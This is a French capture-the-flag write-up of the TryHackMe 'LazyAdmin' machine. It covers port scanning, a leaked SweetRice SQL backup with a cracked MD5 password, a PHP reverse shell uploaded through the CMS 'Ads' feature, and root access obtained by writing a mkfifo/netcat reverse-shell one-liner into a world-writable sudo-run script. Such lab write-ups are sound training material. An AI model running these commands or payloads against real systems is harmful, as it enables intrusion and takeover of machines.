# TryHackMe — LazyAdmin

**Difficulté :** Easy  
**OS :** Linux (Ubuntu)  
**Date :** 2026-05-31  
**Auteur :** N40y

---

## Résumé

LazyAdmin est une machine Linux facile hébergeant un CMS SweetRice 1.5.1. L'exploitation repose sur une chaîne de vulnérabilités : exposition d'un backup SQL contenant des credentials en clair (hash MD5 faible), authentification sur le panel admin, puis RCE via upload d'un webshell PHP dans la section "Ads". La privesc exploite une mauvaise configuration `sudo` combinée à un script world-writable pour obtenir un shell root.

---

## Reconnaissance

### Scan de ports

```bash
nmap -sC -sV -A -p- 10.128.154.177
```

**Résultats :**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |

Scan complémentaire avec RustScan pour confirmation :

```bash
rustscan -a 10.128.154.177 --ulimit 5000
```

### Scan automatisé

```bash
nikto -host http://10.128.154.177
nuclei -target 10.128.154.177
```

Nuclei détecte notamment **CVE-2023-48795** (Terrapin) sur SSH, non exploitable ici. L'application web tourne sur Apache 2.4.18 (outdated).

---

## Enumération Web

### Fuzzing de répertoires

```bash
ffuf -c -u http://10.128.154.177/FUZZ -w common.txt -fc 403
feroxbuster -u http://10.128.154.177/
```

Découverte du répertoire `/content` → CMS **SweetRice 1.5.1**.

Feroxbuster révèle un fichier critique exposé publiquement :

```
http://10.128.154.177/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

> **Vulnérabilité : Information Disclosure — Sensitive File Exposure**  
> Référence : [CWE-538 - Insertion of Sensitive Information into Externally-Accessible File or Directory](https://cwe.mitre.org/data/definitions/538.html)

---

## Exploitation

### 1. Extraction des credentials depuis le backup SQL

```bash
wget http://10.128.154.177/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
grep -E "password|user|admin|INSERT INTO" mysql_bakup_20191129023059-1.5.1.sql
```

Résultat :

| Champ | Valeur |
|-------|--------|
| username | `manager` |
| password (hash) | `42f749ade7f9e195bf475f37a44cafcb` |
| algorithme | MD5 |
| password (clair) | `Password123` |

Le hash MD5 est cracké trivialement (CrackStation, hashcat mode 0, ou même Google).

> **Vulnérabilité : Weak Password Hashing (MD5)**  
> Référence : [CWE-916 - Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)

### 2. Connexion au panel admin SweetRice

URL du panel d'administration :

```
http://10.128.154.177/content/as/
```

Connexion avec `manager` / `Password123`.

![SweetRice Dashboard](first_connection.png)

### 3. Webshell PHP via la section "Ads"

SweetRice 1.5.1 permet d'injecter du contenu PHP arbitraire via **Ads → Add**. On y insère un reverse shell PHP (ex: pentestmonkey) pointant vers notre IP.

> **Vulnérabilité : Authenticated PHP Code Injection via Ads feature — SweetRice 1.5.1**  
> Référence : [Exploit-DB #40716](https://www.exploit-db.com/exploits/40716)  
> Référence : [CWE-94 - Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)

Le webshell est ensuite accessible à :

```
http://10.128.154.177/content/inc/ads/shell.php
```

### 4. Réception du reverse shell

```bash
nc -lvnp 4444
```

Stabilisation du shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
stty rows 50 columns 200
```

Shell obtenu en tant que `www-data`.

---

## Récupération du flag user

```bash
cat /home/itguy/user.txt
```

```
THM{[USER_FLAG]}
```

---

## Élévation de privilèges

### Enumération sudo

```bash
sudo -l
```

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Analyse de la chaîne d'exécution

```bash
cat /home/itguy/backup.pl
```

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

```bash
ls -la /etc/copy.sh
# -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

`/etc/copy.sh` est **world-writable** (permissions `rwx` pour others).

> **Vulnérabilité : Sudo Misconfiguration + World-Writable Script**  
> Référence : [CWE-732 - Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)  
> Référence : [GTFOBins — perl](https://gtfobins.github.io/gtfobins/perl/#sudo)

### Exploitation

On remplace le contenu de `/etc/copy.sh` par un reverse shell :

```bash
cat > /etc/copy.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.52 5555 >/tmp/f
EOF
chmod +x /etc/copy.sh
```

Sur la machine attaquante, on lance un second listener :

```bash
nc -lvnp 5555
```

On déclenche l'exécution via sudo :

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

### Shell root obtenu

```
# whoami
root
```

---

## Récupération du flag root

```bash
cat /root/root.txt
```

```
THM{[ROOT_FLAG]}
```

---

## Chaîne d'exploitation résumée

```
Reconnaissance (nmap/ffuf)
        ↓
Backup SQL exposé publiquement
        ↓
Credentials manager:Password123 (MD5 faible)
        ↓
Authentification SweetRice /content/as/
        ↓
RCE via injection PHP dans "Ads" (EDB-40716)
        ↓
Reverse shell www-data
        ↓
sudo NOPASSWD: perl → backup.pl → /etc/copy.sh (world-writable)
        ↓
Root shell
```

---

## Références

| Vulnérabilité | Référence |
|---|---|
| Sensitive File Exposure | [CWE-538](https://cwe.mitre.org/data/definitions/538.html) |
| MD5 Password Hashing | [CWE-916](https://cwe.mitre.org/data/definitions/916.html) |
| SweetRice 1.5.1 Code Injection | [Exploit-DB #40716](https://www.exploit-db.com/exploits/40716) |
| PHP Code Injection | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) |
| Sudo Misconfiguration | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) |
| GTFOBins perl | [gtfobins.github.io/gtfobins/perl](https://gtfobins.github.io/gtfobins/perl/#sudo) |
